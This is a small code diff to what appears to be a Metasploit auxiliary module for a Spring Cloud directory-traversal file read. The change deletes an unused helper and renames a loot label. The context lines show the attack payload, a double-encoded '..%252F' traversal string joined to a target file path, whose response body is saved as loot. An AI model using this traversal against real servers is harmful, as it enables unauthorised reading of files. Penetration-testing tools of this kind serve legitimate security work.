@@ -40,10 +40,6 @@ class MetasploitModule < Msf::Auxiliary
       ])
   end
 
-  def data
-    Rex::Text.rand_text_alpha(3..8)
-  end
-
   def run_host(ip)
     filename = datastore['FILEPATH']
     traversal = "#{"..%252F" * datastore['DEPTH']}#{filename}"
@@ -61,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
 
     vprint_good("#{peer} - #{res.body}")
     path = store_loot(
-      'springcloud.traversal2',
+      'springcloud.traversal',
       'text/plain',
       ip,
       res.body,
